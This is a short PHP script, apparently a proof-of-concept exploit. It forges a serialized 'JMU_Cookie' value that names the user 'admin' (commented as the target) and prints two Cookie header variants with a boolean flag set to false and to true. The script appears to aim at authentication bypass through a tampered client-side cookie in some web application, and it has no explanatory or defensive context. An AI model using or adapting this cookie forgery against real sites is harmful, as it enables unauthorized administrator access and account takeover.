<?php
$data = array();
$user = 'admin'; // Target

$data[0] = base64_encode(serialize($user));
$data[1] = (bool)0;
echo "\n\n===[ 0 ] ========================\n\n";
echo 'Cookie: JMU_Cookie=' . urlencode(serialize($data));
$data[1] = (bool)1;
echo "\n\n===[ 1 ] ========================\n\n";
echo 'Cookie: JMU_Cookie=' . urlencode(serialize($data));
?>
